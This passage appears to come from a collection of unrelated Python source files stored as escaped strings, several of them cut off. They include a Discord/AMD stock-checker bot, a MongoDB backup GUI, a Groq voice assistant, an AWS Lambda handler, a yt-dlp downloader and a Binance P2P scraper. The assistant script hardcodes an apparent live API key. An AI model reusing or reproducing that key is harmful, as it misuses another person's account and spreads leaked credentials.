spreadsheetId=DATA_SPREADSHEET_ID,\n            range=range_to_write,\n            valueInputOption=\"RAW\",\n            body={\"values\": game_data.serialize()},\n        )\n        .execute()\n    )\n\n\ndef add_char(char: str, add: int):\n    return chr((ord(char) - ord(\"A\") + add) % 26 + ord(\"A\"))\n",
    "import time\nfrom selenium import webdriver\n\ndriver = webdriver.Chrome(executable_path=\"Desktop\\chromedriver_win32\\chromedriver.exe\")\ndriver.maximize_window()\nmyPageTitle = driver.title\n\ndriver.get(\"https://discord.com/login\")\ntime.sleep(2)\ndriver.find_element_by_name(\"email\").send_keys(\"your_email@example.com\")\ndriver.find_element_by_name(\"password\").send_keys(\"password\")\ndriver.find_element_by_css_selector('[type=\"submit\"]').click()\ntime.sleep(8)\ndriver.find_element_by_css_selector('[aria-label=\"Schlie\u00dfen\"]').click()\ndriver.find_element_by_css_selector('[aria-label=\"Stummschalten\"]').click()\n#driver.switch_to_alert().accept()\n\ndriver.get(\"https://www.amd.com/de/direct-buy/5530312900/de\")\ntime.sleep(2)\ndriver.find_element_by_id(\"onetrust-accept-btn-handler\").click()\ntime.sleep(2)\n\n\n\n \nwhile True:\n    driver.get(\"https://www.amd.com/de/direct-buy/5530312900/de\")\n    time.sleep(2)\n    driver.get(\"https://www.amd.com/de/direct-buy/5530312900/de\")\n    time.sleep(2)\n    \n        \n    if driver.find_elements_by_class_name(\"btn-shopping-cart\"):\n        print (\"IN STOCK\")\n        driver.get(\"https://discord.com/channels/@me/848328151016538163\")\n        time.sleep(4)\n        driver.find_element_by_css_selector('[aria-label=\"Sprachanruf starten\"]').click()\n        time.sleep(20)\n        driver.find_element_by_css_selector('[aria-label=\"Verbindung trennen\"]').click()\n        \n\n\n    else:\n        driver.find_element_by_class_name(\"product-out-of-stock\")\n        print (\"OUT OF STOCK\")\n        driver.get(\"https://kamalidris.de/\")\n        time.sleep(2)\n",
    "import os\nimport subprocess\nimport json\nimport sys\nimport logging\nimport tkinter as tk\nfrom tkinter import ttk, filedialog, messagebox\nfrom pymongo import MongoClient\nimport threading\n\ntry:\n    from version import VERSION\nexcept ImportError:\n    VERSION = \"development\"\n\nclass MongoBackupGUI:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"MongoDB Backup Tool\")\n        self.root.geometry(\"600x500\")\n        self.root.resizable(True, True)\n        self.root.title(f\"MongoDB Backup Tool v{VERSION}\")\n        # Configure logging\n        logging.basicConfig(level=logging.INFO)\n        self.logger = logging.getLogger(__name__)\n        \n        # Create main frame\n        main_frame = ttk.Frame(root, padding=\"10\")\n        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))\n        \n        # MongoDB URI\n        ttk.Label(main_frame, text=\"MongoDB URI:\").grid(row=0, column=0, sticky=tk.W, pady=5)\n        self.uri_var = tk.StringVar(value=\"mongodb://localhost:27017\")\n        uri_entry = ttk.Entry(main_frame, textvariable=self.uri_var, width=50)\n        uri_entry.grid(row=0, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)\n        \n        # Test Connection Button\n        ttk.Button(main_frame, text=\"Test Connection\", command=self.test_connection).grid(row=0, column=3, padx=5, pady=5)\n        \n        # Database Selection\n        ttk.Label(main_frame, text=\"Databases:\").grid(row=1, column=0, sticky=tk.W, pady=5)\n        self.db_listbox = tk.Listbox(main_frame, selectmode=tk.MULTIPLE, height=6)\n        self.db_listbox.grid(row=1, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)\n        \n        # Refresh Databases Button\n        ttk.Button(main_frame, text=\"Refresh\", command=self.refresh_databases).grid(row=1, column=3, padx=5, pady=5)\n        \n        # MongoDB Tools Path\n        ttk.Label(main_frame, text=\"Tools Path:\").grid(row=2, column=0, sticky=tk.W, pady=5)\n        self.tools_path_var = tk.StringVar(value=os.path.join(os.getcwd(), \"mongodb-database-tools\", \"bin\"))\n        tools_entry = ttk.Entry(main_frame, textvariable=self.tools_path_var, width=50)\n        tools_entry.grid(row=2, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)\n        ttk.Button(main_frame, text=\"Browse\", command=self.browse_tools).grid(row=2, column=3, padx=5, pady=5)\n        \n        # Backup Directory\n        ttk.Label(main_frame, text=\"Backup Dir:\").grid(row=3, column=0, sticky=tk.W, pady=5)\n        self.backup_dir_var = tk.StringVar(value=os.path.join(os.getcwd(), \"database_backup\"))\n        backup_entry = ttk.Entry(main_frame, textvariable=self.backup_dir_var, width=50)\n        backup_entry.grid(row=3, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)\n        ttk.Button(main_frame, text=\"Browse\", command=self.browse_backup).grid(row=3, column=3, padx=5, pady=5)\n        \n        # Progress\n        self.progress_var = tk.StringVar(value=\"Ready\")\n        ttk.Label(main_frame, text=\"Status:\").grid(row=4, column=0, sticky=tk.W, pady=5)\n        ttk.Label(main_frame, textvariable=self.progress_var).grid(row=4, column=1, columnspan=3, sticky=tk.W, pady=5)\n        \n        # Progress Bar\n        self.progress_bar = ttk.Progressbar(main_frame, mode='determinate')\n        self.progress_bar.grid(row=5, column=0, columnspan=4, sticky=(tk.W, tk.E), pady=5)\n        \n        # Backup Button\n        self.backup_button = ttk.Button(main_frame, text=\"Start Backup\", command=self.start_backup)\n        self.backup_button.grid(row=6, column=0, columnspan=4, pady=20)\n        \n        # Log Display\n        ttk.Label(main_frame, text=\"Log:\").grid(row=7, column=0, sticky=tk.W)\n        self.log_text = tk.Text(main_frame, height=8, width=60)\n        self.log_text.grid(row=8, column=0, columnspan=4, sticky=(tk.W, tk.E))\n        \n        # Scrollbar for Log\n        scrollbar = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=self.log_text.yview)\n        scrollbar.grid(row=8, column=4, sticky=(tk.N, tk.S))\n        self.log_text['yscrollcommand'] = scrollbar.set\n        \n        # Configure grid weights\n        root.columnconfigure(0, weight=1)\n        root.rowconfigure(0, weight=1)\n        main_frame.columnconfigure(1, weight=1)\n        \n    def log_message(self, message):\n        self.log_text.insert(tk.END, f\"{message}\\n\")\n        self.log_text.see(tk.END)\n        self.root.update_idletasks()\n        \n    def test_connection(self):\n        try:\n            client = MongoClient(self.uri_var.get(), serverSelectionTimeoutMS=5000)\n            client.server_info()\n            messagebox.showinfo(\"Success\", \"Successfully connected to MongoDB!\")\n            self.refresh_databases()\n        except Exception as e:\n            messagebox.showerror(\"Error\", f\"Failed to connect: {str(e)}\")\n            \n    def refresh_databases(self):\n        try:\n            client = MongoClient(self.uri_var.get())\n            self.db_listbox.delete(0, tk.END)\n            for db in client.list_database_names():\n                sel",
    "import webbrowser\r\nimport musicLibraries\r\nfrom groq import Groq\r\n\r\n    # print(\"Hi, I'm Sagar. How can I help you?\")\r\n    # command = input(\"==> \")\r\n\r\ndef aiProsses(command, context=None):\r\n\r\n    client = Groq(api_key= \"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\")\r\n\r\n    # The variable messages is a list of dictionaries.\r\n    messages = [\r\n        {\"role\": \"system\", \"content\": \"You are a virtual assistant named Sagar Biswas. You are skilled in general tasks like programming and cyber-security. Generate texts that are tuned like Back-Hats Hackers. Must try to give short responses with perfect and understandable results with easy words..\"},\r\n        {\"role\": \"system\", \"content\": \"You are a helpful teacher. Users are CSE students and their dream is Cyber-Security. You should help the students as best you can.\"},\r\n    ]\r\n\r\n    if context is not None:  # Check if context is provided\r\n        messages.append({\"role\": \"system\", \"content\": str(context)})  # Added context to messages\r\n\r\n    \r\n    messages.append({\"role\": \"user\", \"content\": command})\r\n\r\n    completion = client.chat.completions.create(\r\n        model=\"llama3-70b-8192\",\r\n        messages=messages\r\n    )\r\n\r\n    return completion.choices[0].message.content\r\n\r\n\r\ndef prossess_command(command, context=None):\r\n\r\n    url_map = {\r\n        \"open google\": \"https://google.com\",\r\n        \"open youtube\": \"https://youtube.com\",\r\n        \"open facebook\": \"https://facebook.com\",\r\n        \"open instagram\": \"https://instagram.com\",\r\n        \"open github\": \"https://github.com\",\r\n        \"open stackoverflow\": \"https://stackoverflow.com\",\r\n        \"open linkedin\": \"https://linkedin.com\",\r\n        \"open whatsapp\": \"https://whatsapp.com\",\r\n        \"open chatgpt\": \"https://chat.openai.com/chat\",\r\n        \"open gemini\": \"https://gemini.google.com/\",\r\n        \"open chatbot\": \"https://cdn.botpress.cloud/webchat/v2/shareable.html?botId=2b113ef8-ac77-4553-b353-7e381fcffdde\"\r\n    }\r\n\r\n    command = command.lower()\r\n\r\n    if command in url_map:\r\n        webbrowser.open(url_map[command])\r\n    elif command.startswith(\"play\"):\r\n        try:\r\n            words = command.split(\" \")\r\n            if len(words) > 1:\r\n                song = words[1]\r\n                link = musicLibraries.musicLinks.get(song, None)\r\n                \r\n                if link is not None:\r\n                    webbrowser.open(link)\r\n                else:\r\n                    print(\"..:: Song is not found in the music library. \")\r\n            else:\r\n                print(\"..:: Invalid Command. No song specified. \")\r\n        except Exception as e:\r\n            print(f\"Error: {e}\")\r\n    else: \r\n        output = aiProsses(command, context)\r\n        print(f\"\\nAI Response: {output}\\n\")\r\n\r\n        if context is None:\r\n            context = []\r\n\r\n        # Ensure context is a list\r\n        if not isinstance(context, list):\r\n            context = []  # Reset context to an empty list if it is not a list\r\n        \r\n        context.append({\"role\": \"user\", \"content\": command})\r\n        context.append({\"role\": \"assistant\", \"content\": output})\r\n\r\n        return context\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    context = None\r\n    print(\"\\nHi, I'm Sagar. How can I help you?\\n\")\r\n    \r\n    while True:\r\n        command = input(\"==> \")\r\n        if command.lower() != \"exit\":\r\n            context = prossess_command(command, context)\r\n        else:\r\n            break\r\n\r\n",
    "import boto3\nimport json\nimport base64\nfrom decimal import Decimal\nimport os\n\n# Initialize DynamoDB\nDYNAMODB_TABLE_NAME = os.environ[\"dynamo_db_table\"]\nREGION_NAME = os.environ[\"region\"]\n\ndynamodb = boto3.resource(\"dynamodb\", region_name=REGION_NAME)\ntable = dynamodb.Table(DYNAMODB_TABLE_NAME)\n\ndef lambda_handler(event, context):\n    try:\n        # Check if \"Records\" key exists in the event\n        if \"Records\" not in event:\n            raise KeyError(\"The 'Records' key is missing from the event payload.\")\n\n        # Process records from Kinesis\n        for record in event[\"Records\"]:\n            # Check if \"data\" exists in the record\n            if \"kinesis\" in record and \"data\" in record[\"kinesis\"]:\n                raw_data = record[\"kinesis\"][\"data\"]\n                print(\"Raw Kinesis data (Base64):\", raw_data)\n\n                if not raw_data.strip():\n                    print(\"Empty data received, skipping...\")\n                    continue\n\n                # Decode the Kinesis payload (Base64 -> JSON)\n                try:\n                    decoded_data = base64.b64decode(raw_data).decode('utf-8')\n                    print(\"Decoded Kinesis data:\", decoded_data)\n\n                    # Parse the decoded JSON data\n                    payload = json.loads(decoded_data, parse_float=Decimal)\n                    print(\"Parsed JSON data:\", payload)\n\n                    # Ensure that the 'city' and 'timestamp' keys are in the payload\n                    if \"city\" not in payload or \"timestamp\" not in payload:\n                        raise KeyError(\"'city' or 'timestamp' key is missing in the payload.\")\n\n                    # Write data to DynamoDB\n                    table.put_item(Item=payload)\n                    print(\"Data written to DynamoDB:\", payload)\n\n                except (json.JSONDecodeError, KeyError, base64.binascii.Error) as e:\n                    print(f\"Error decoding data: {str(e)}\")\n                    continue\n            else:\n                print(\"Invalid record structure:\", record)\n\n        return {\n            \"statusCode\": 200,\n            \"body\": json.dumps(\"Data processed and stored successfully!\")\n        }\n\n    except Exception as e:\n        print(\"Error processing event:\", str(e))\n        return {\n            \"statusCode\": 500,\n            \"body\": json.dumps(f\"An error occurred: {str(e)}\")\n        }\n",
    "import os;\nimport yt_dlp;\nfrom termcolor import cprint\n\ndef main():\n    print(\"-----------------------------------------------------\")\n    print(\"                X-Cube Video Downloader\")\n    print()\n    print(\"   1   -   \uc624\ub514\uc624 + \ube44\ub514\uc624 \ub2e4\uc6b4\ub85c\ub4dc\")\n    print(\"   2   -   \uc624\ub514\uc624\ub9cc \ub2e4\uc6b4\ub85c\ub4dc\")\n    print(\"   3   -   \ube44\ub514\uc624\ub9cc \ub2e4\uc6b4\ub85c\ub4dc\")\n    print(\"   4   -   \ub098\uac00\uae30\")\n    print()\n    print(\"--------------------------------------------------\")\n    print()\n    mode = input(\"\uc6d0\ud558\uc2dc\ub294 \uae30\ub2a5\uc5d0 \ub9de\ub294 \uc22b\uc790\ub97c \uc785\ub825\ud558\uc2ed\uc2dc\uc624:       -        \");\n\n    if mode == \"1\":\n        download_av();\n    elif mode == \"2\":\n        download_audio();\n    elif mode == \"3\":\n        download_video();\n    elif mode == \"4\":\n        print(\"\ud504\ub85c\uadf8\ub7a8 \uc885\ub8cc...\");\n\ndef download_video():\n    cls();\n    print(\"-----------------------------------------------------\")\n    print(\"                X-Cube Video Downloader\")\n    print(\"                \uc0ac\uc6a9\ud574\uc8fc\uc154\uc11c \uac10\uc0ac\ud569\ub2c8\ub2e4.\")\n    print(\"\")\n    print(\"               \uc601\uc0c1 \ub9c1\ud06c\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694.\")\n    print(\"--------------------------------------------------\")\n    print()\n    url = input(\"\ub9c1\ud06c:       -        \");\n    resolution_video(url);\n\ndef download_audio():\n    cls();\n    print(\"-----------------------------------------------------\")\n    print(\"                X-Cube Video Downloader\")\n    print(\"                \uc0ac\uc6a9\ud574\uc8fc\uc154\uc11c \uac10\uc0ac\ud569\ub2c8\ub2e4.\")\n    print(\"\")\n    print(\"               \uc601\uc0c1 \ub9c1\ud06c\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694.\")\n    print(\"--------------------------------------------------\")\n    print()\n    url = input(\"\ub9c1\ud06c:       -        \");\n    output_path = \"downloads\"\n    try:\n        # \ub2e4\uc6b4\ub85c\ub4dc \ud3f4\ub354 \uc0dd\uc131\n        os.makedirs(output_path, exist_ok=True)\n        \n        # yt-dlp \uc635\uc158 \uc124\uc815 (\uc624\ub514\uc624\ub9cc \ub2e4\uc6b4\ub85c\ub4dc -> MP3\ub85c \ucd94\ucd9c)\n        ydl_opts = {\n            'outtmpl': f'{output_path}/%(title)s.%(ext)s',  \n            'format': 'bestaudio/best',   # \ucd5c\uace0 \uc74c\uc9c8 \uc624\ub514\uc624 \uc2a4\ud2b8\ub9bc\n            'postprocessors': [\n                {\n                    'key': 'FFmpegExtractAudio',    # FFmpeg\ub85c \uc624\ub514\uc624 \ucd94\ucd9c\n                    'preferredcodec': 'mp3',        # MP3 \ucf54\ub371\uc73c\ub85c \ubcc0\ud658\n                    'preferredquality': '192',      # 192kbps\n                },\n            ],\n        }\n\n        with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n            ydl.download([url])\n            print(\"\uc624\ub514\uc624(MP3) \ub2e4\uc6b4\ub85c\ub4dc\uac00 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\")\n            input(\"\uba54\uc778 \ud654\uba74\uc73c\ub85c \uc774\ub3d9\ud558\ub824\uba74 \uc5d4\ud130\ub97c \ub204\ub974\uc138\uc694.\")\n            main()\n\n    except Exception as e:\n        print(f\"\uc624\ub958 \ubc1c\uc0dd: {e}\")\n        input(\"\uba54\uc778 \ud654\uba74\uc73c\ub85c \uc774\ub3d9\ud558\ub824\uba74 \uc5d4\ud130\ub97c \ub204\ub974\uc138\uc694.\")\n        main()\n\ndef resolution_video(url):\n    cls();\n    print(\"-----------------------------------------------------\")\n    print(\"                X-Cube Video Downloader\")\n    print(\"    \uc601\uc0c1 \ub9c1\ud06c - \" + url)\n    print(\"\")\n    print(\"    1   -   144p\")\n    print(\"    2   -   240p\")\n    print(\"    3   -   360p\")\n    print(\"    4   -   480p\")\n    print(\"    5   -   720p\")\n    print(\"    6   -   1080p [HD]\")\n    print(\"    7   -   1440p [HD/2K]\")\n    print(\"    8   -   2160p [4K]\")\n    print(\"    9   -   4320p [8K]\")\n    print(\"\")\n    cprint(\"\uc8fc\uc758\uc0ac\ud56d    |     \uc601\uc0c1\uc5d0 \ud574\ub2f9 \ud654\uc9c8\uc774 \uc5c6\ub2e4\uba74 \ud504\ub85c\uadf8\ub7a8\uc774 \uc790\ub3d9\uc73c\ub85c \uba54\uc778\ud654\uba74\uc73c\ub85c \uac00\uc9c0\uac8c\ub429\ub2c8\ub2e4.\", \"red\")\n    print(\"\")\n    print(\"--------------------------------------------------\")\n    resolution = input(\"\ud654\uc9c8\uc5d0 \ub9de\ub294 \ubc88\ud638 \uc120\ud0dd      -     \");\n\n    download_videoonly(url, resolution);\n\ndef download_videoonly(url, resolution):\n    output_path = \"downloads\"\n    try:\n        # \ub2e4\uc6b4\ub85c\ub4dc \ud3f4\ub354 \uc0dd\uc131\n        os.makedirs(output_path, exist_ok=True)\n\n        real_resolution = convert_resolution(resolution)\n        \n        # yt-dlp \uc635\uc158 \uc124\uc815 (\ube44\ub514\uc624\ub9cc \ub2e4\uc6b4\ub85c\ub4dc)\n        ydl_opts = {\n            'outtmpl': f'{output_path}/%(title)s.%(ext)s', \n            'format': f\"bestvideo[height={real_resolution}]\",  # \uc624\uc9c1 \ube44\ub514\uc624 \uc2a4\ud2b8\ub9bc\ub9cc\n            'merge_output_format': 'mp4',                       # \ucd5c\uc885 \ud30c\uc77c\uc744 mp4\ub85c \uc800\uc7a5\n            # FFmpeg \uc778\uc790 \uc124\uc815 (\ube44\ub514\uc624\ub294 \uadf8\ub300\ub85c \ubcf5\uc0ac, \uc624\ub514\uc624\ub294 \uc5c6\uc74c)\n            'postprocessor_args': [\n                '-c:v', 'copy'  # \ube44\ub514\uc624 \uc7ac\uc778\ucf54\ub529 \uc5c6\uc774 \uadf8\ub300\ub85c \ubcf5\uc0ac\n            ],\n            'postprocessors': [\n                {\n                    'key': 'FFmpegVideoRemuxer',\n                    'preferedformat': 'mp4',  # mp4 \ucee8\ud14c\uc774\ub108\ub85c remux\n                },\n            ],\n        }\n        \n        # yt-dlp \uc2e4\ud589\n        with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n            ydl.download([url])\n            print(\"\ube44\ub514\uc624(\uc601\uc0c1\ub9cc) \ub2e4\uc6b4\ub85c\ub4dc\uac00 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\")\n            input(\"\uba54\uc778 \ud654\uba74\uc73c\ub85c \uc774\ub3d9\ud558\ub824\uba74 \uc5d4\ud130\ub97c \ub204\ub974\uc138\uc694.\")\n            main()\n\n    except Exception as e:\n        print(f\"\uc624\ub958 \ubc1c\uc0dd: {e}\")\n        input(\"\uba54\uc778 \ud654\uba74\uc73c\ub85c \uc774\ub3d9\ud558\ub824\uba74 \uc5d4\ud130\ub97c \ub204\ub974\uc138\uc694.\")\n        main()\n\ndef download_av():\n    cls();\n    print(\"-----------------------------------------------------\")\n    print(\"                X-Cube Video Downloader\")\n    print(\"                \uc0ac\uc6a9\ud574\uc8fc\uc154\uc11c \uac10\uc0ac\ud569\ub2c8\ub2e4.\")\n    print(\"\")\n    print(\"               \uc601\uc0c1 \ub9c1\ud06c\ub97c \uc785\ub825\ud574\uc8fc\uc138\uc694.\")\n    print(\"--------------------------------------------------\")\n    print()\n    url = input(\"\ub9c1\ud06c:       -        \");\n    resolution_av(url);\n\ndef resolution_av(url):\n    cls();\n    print(\"-----------------------------------------------------\")\n    print(\"                X-Cube Video Downloader\")\n    print(\"    \uc601\uc0c1 \ub9c1\ud06c - \" + url)\n    print(\"\")\n    print(\"    1   -   144p\")\n    print(\"    2   -   240p\")\n    print(\"    3   -   360p\")\n    print(\"    4   -   480p\")\n ",
    "\nimport jieba\nfrom pathlib import Path\nfrom tensorflow.contrib import predictor\nfrom functools import partial\n\nimport sys\nimport io\n# \u624b\u52a8\u8bbe\u7f6e stdout \u4e3a UTF-8 \u7f16\u7801\nsys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')\n\n\n\nif len(sys.argv) < 2:\n    print(\"Usage: python txt-serve.py <path_to_comments_file>\")\n    sys.exit(1)\n\nCOMMENTS_FILE = sys.argv[1]  # \u4ece\u547d\u4ee4\u884c\u83b7\u53d6\u6587\u4ef6\u8def\u5f84\n\ndef predict(pred_fn, line):\n    sentence = ' '.join(jieba.cut(line.strip(), cut_all=False, HMM=True))\n    words = [w.encode() for w in sentence.strip().split()]\n    nwords = len(words)\n    predictions = pred_fn({'words': [words], 'nwords': [nwords]})\n    return predictions\n\nif __name__ == '__main__':\n    export_dir = 'D:/java/vue01/chinese_sentiment-master/model/lstm/saved_model'\n    subdirs = [x for x in Path(export_dir).iterdir() if x.is_dir() and 'temp' not in str(x)]\n    latest = str(sorted(subdirs)[-1])\n    predict_fn = partial(predict, predictor.from_saved_model(latest))\n\n    with open(COMMENTS_FILE, 'r', encoding='utf-8') as f:\n        for line in f:\n            line = line.strip()\n            if line:\n                print(f\"\u8bc4\u8bba: {line}\")\n                prediction = predict_fn(line)\n                print(f\"\u9884\u6d4b\u7ed3\u679c: {prediction}\")\n                print(\"=\"*50)\n",
    "from abc import ABC, abstractmethod\nfrom dataclasses import dataclass\nfrom typing import Dict, Optional, Tuple\n\nimport torch\n\nfrom shap_e.models.nn.meta import MetaModule\nfrom shap_e.models.nn.utils import ArrayType, safe_divide, to_torch\n\n\n@dataclass\nclass VolumeRange:\n    t0: torch.Tensor\n    t1: torch.Tensor\n    intersected: torch.Tensor\n\n    def __post_init__(self):\n        assert self.t0.shape == self.t1.shape == self.intersected.shape\n\n    def next_t0(self):\n        \"\"\"\n        Given convex volume1 and volume2, where volume1 is contained in\n        volume2, this function returns the t0 at which rays leave volume1 and\n        intersect with volume2 \\\\ volume1.\n        \"\"\"\n        return self.t1 * self.intersected.float()\n\n    def extend(self, another: \"VolumeRange\") -> \"VolumeRange\":\n        \"\"\"\n        The ranges at which rays intersect with either one, or both, or none of\n        the self and another are merged together.\n        \"\"\"\n        return VolumeRange(\n            t0=torch.where(self.intersected, self.t0, another.t0),\n            t1=torch.where(another.intersected, another.t1, self.t1),\n            intersected=torch.logical_or(self.intersected, another.intersected),\n        )\n\n    def partition(self, ts) -> Tuple[torch.Tensor, torch.Tensor, torch.Tensor]:\n        \"\"\"\n        Partitions t0 and t1 into n_samples intervals.\n\n        :param ts: [batch_size, *shape, n_samples, 1]\n        :return: a tuple of (\n            lower: [batch_size, *shape, n_samples, 1]\n            upper: [batch_size, *shape, n_samples, 1]\n            delta: [batch_size, *shape, n_samples, 1]\n        ) where\n\n            ts \\\\in [lower, upper]\n            deltas = upper - lower\n        \"\"\"\n        mids = (ts[..., 1:, :] + ts[..., :-1, :]) * 0.5\n        lower = torch.cat([self.t0[..., None, :], mids], dim=-2)\n        upper = torch.cat([mids, self.t1[..., None, :]], dim=-2)\n        delta = upper - lower\n        assert lower.shape == upper.shape == delta.shape == ts.shape\n        return lower, upper, delta\n\n\nclass Volume(ABC):\n    \"\"\"\n    An abstraction of rendering volume.\n    \"\"\"\n\n    @abstractmethod\n    def intersect(\n        self,\n        origin: torch.Tensor,\n        direction: torch.Tensor,\n        t0_lower: Optional[torch.Tensor] = None,\n        params: Optional[Dict] = None,\n        epsilon: float = 1e-6,\n    ) -> VolumeRange:\n        \"\"\"\n        :param origin: [batch_size, *shape, 3]\n        :param direction: [batch_size, *shape, 3]\n        :param t0_lower: Optional [batch_size, *shape, 1] lower bound of t0 when intersecting this volume.\n        :param params: Optional meta parameters in case Volume is parametric\n        :param epsilon: to stabilize calculations\n\n        :return: A tuple of (t0, t1, intersected) where each has a shape\n            [batch_size, *shape, 1]. If a ray intersects with the volume, `o + td` is\n            in the volume for all t in [t0, t1]. If the volume is bounded, t1 is guaranteed\n            to be on the boundary of the volume.\n        \"\"\"\n\n\nclass BoundingBoxVolume(MetaModule, Volume):\n    \"\"\"\n    Axis-aligned bounding box defined by the two opposite corners.\n    \"\"\"\n\n    def __init__(\n        self,\n        *,\n        bbox_min: ArrayType,\n        bbox_max: ArrayType,\n        min_dist: float = 0.0,\n        min_t_range: float = 1e-3,\n        device: torch.device = torch.device(\"cuda\"),\n    ):\n        \"\"\"\n        :param bbox_min: the left/bottommost corner of the bounding box\n        :param bbox_max: the other corner of the bounding box\n        :param min_dist: all rays should start at least this distance away from the origin.\n        \"\"\"\n        super().__init__()\n\n        self.bbox_min = to_torch(bbox_min).to(device)\n        self.bbox_max = to_torch(bbox_max).to(device)\n        self.min_dist = min_dist\n        self.min_t_range = min_t_range\n        self.bbox = torch.stack([self.bbox_min, self.bbox_max])\n        assert self.bbox.shape == (2, 3)\n        assert self.min_dist >= 0.0\n        assert self.min_t_range > 0.0\n        self.device = device\n\n    def intersect(\n        self,\n        origin: torch.Tensor,\n        direction: torch.Tensor,\n        t0_lower: Optional[torch.Tensor] = None,\n        params: Optional[Dict] = None,\n        epsilon=1e-6,\n    ) -> VolumeRange:\n        \"\"\"\n        :param origin: [batch_size, *shape, 3]\n        :param direction: [batch_size, *shape, 3]\n        :param t0_lower: Optional [batch_size, *shape, 1] lower bound of t0 when intersecting this volume.\n        :param params: Optional meta parameters in case Volume is parametric\n        :param epsilon: to stabilize calculations\n\n        :return: A tuple of (t0, t1, intersected) where each has a shape\n            [batch_size, *shape, 1]. If a ray intersects with the volume, `o + td` is\n            in the volume for all t in [t0, t1]. If the volume is bounded, t1 is guaranteed\n            to be on the boundary of the volume.\n        \"\"\"\n\n        batch_size, *shape, _ = origin.shape\n        ones = [1] * len(shape",
    "import requests\r\nimport time\r\n\r\ndef get_p2p_offers_binance(asset, fiat, trade_type, payment_method=None, amount=None):\r\n    url = \"https://p2p.binance.com/bapi/c2c/v2/friendly/c2c/adv/search\"\r\n    headers = {\r\n        \"Content-Type\": \"application/json\",\r\n        \"User-Agent\": \"Mozilla/5.0\"\r\n    }\r\n    payload = {\r\n        \"asset\": asset,  # \"USDT\", \"BTC\", etc.\r\n        \"fiat\": fiat,  # \"RUB\", \"USD\", etc.\r\n        \"tradeType\": trade_type,  # \"BUY\" or \"SELL\"\r\n        \"transAmount\": amount if amount else \"\",\r\n        \"payTypes\": [payment_method] if payment_method else [],\r\n        \"page\": 1,\r\n        \"rows\": 10,  # Number of offers\r\n        \"publisherType\": None\r\n    }\r\n\r\n    response = requests.post(url, json=payload, headers=headers)\r\n    if response.status_code == 200:\r\n        return response.json().get(\"data\", [])\r\n    else:\r\n        print(f\"Binance error: {response.status_code}, {response.text}\")\r\n        return []\r\n\r\ndef get_best_offer(offers, trade_type):\r\n    if not offers:\r\n        return None\r\n\r\n    if trade_type == \"BUY\":\r\n        return min(offers, key=lambda o: float(o[\"adv\"][\"price\"]))\r\n    else:  # SELL\r\n        return max(offers, key=lambda o: float(o[\"adv\"][\"price\"]))\r\n\r\ndef display_offer(exchange_name, offer, trade_type):\r\n    adv = offer[\"adv\"]\r\n    advertiser = offer[\"advertiser\"]\r\n    print(f\"\u0411\u0438\u0440\u0436\u0430: {exchange_name}\")\r\n    print(f\"\u0426\u0435\u043d\u0430: {adv['price']} {adv['fiatUnit']}, \u041c\u0438\u043d: {adv['minSingleTransAmount']}, \u041c\u0430\u043a\u0441: {adv['maxSingleTransAmount']}\")\r\n    print(f\"\u041f\u0440\u043e\u0434\u0430\u0432\u0435\u0446: {advertiser['nickName']} ({advertiser['userNo']})\")\r\n    print(f\"\u041c\u0435\u0442\u043e\u0434\u044b \u043e\u043f\u043b\u0430\u0442\u044b: {', '.join(m['tradeMethodName'] for m in adv['tradeMethods'])}\")\r\n    print(\"-\" * 50)\r\n\r\ndef calculate_spread(buy_price, sell_price):\r\n    return (sell_price - buy_price) / buy_price * 100\r\n\r\nif __name__ == \"__main__\":\r\n    exchanges = {\r\n        \"Binance\": get_p2p_offers_binance\r\n        # \u0421\u044e\u0434\u0430 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0434\u0440\u0443\u0433\u0438\u0435 \u0431\u0438\u0440\u0436\u0438, \u043d\u0430\u043f\u0440\u0438\u043c\u0435\u0440 \"Huobi\": get_p2p_offers_huobi\r\n    }\r\n\r\n    asset = \"USDT\"\r\n    fiats = [\"RUB\", \"UAH\", \"USD\"]\r\n    trade_type_buy = \"BUY\"\r\n    trade_type_sell = \"SELL\"\r\n    payment_method = \"Tinkoff\"  # Optional\r\n    amount = None  # Optional\r\n\r\n    while True:\r\n        for fiat in fiats:\r\n            best_buy_offer = None\r\n            best_sell_offer = None\r\n\r\n            print(f\"=== \u0410\u043d\u0430\u043b\u0438\u0437 \u0434\u043b\u044f {fiat} ===\")\r\n\r\n            for exchange_name, get_offers in exchanges.items():\r\n                buy_offers = get_offers(asset, fiat, trade_type_buy, payment_method, amount)\r\n                sell_offers = get_offers(asset, fiat, trade_type_sell, payment_method, amount)\r\n\r\n                best_buy = get_best_offer(buy_offers, trade_type_buy)\r\n                best_sell = get_best_offer(sell_offers, trade_type_sell)\r\n\r\n                if best_buy:\r\n                    display_offer(exchange_name, best_buy, trade_type_buy)\r\n                    if not best_buy_offer or float(best_buy[\"adv\"][\"price\"]) < float(best_buy_offer[\"adv\"][\"price\"]):\r\n                        best_buy_offer = best_buy\r\n\r\n                if best_sell:\r\n                    display_offer(exchange_name, best_sell, trade_type_sell)\r\n                    if not best_sell_offer or float(best_sell[\"adv\"][\"price\"]) > float(best_sell_offer[\"adv\"][\"price\"]):\r\n                        best_sell_offer = best_sell\r\n\r\n            if best_buy_offer and best_sell_offer:\r\n                buy_price = float(best_buy_offer[\"adv\"][\"price\"])\r\n                sell_price = float(best_sell_offer[\"adv\"][\"price\"])\r\n                spread = calculate_spread(buy_price, sell_price)\r\n\r\n                print(f\"\u041b\u0443\u0447\u0448\u0438\u0439 \u043a\u0443\u0440\u0441 \u043f\u043e\u043a\u0443\u043f\u043a\u0438: {buy_price} {fiat}\")\r\n                print(f\"\u041b\u0443\u0447\u0448\u0438\u0439 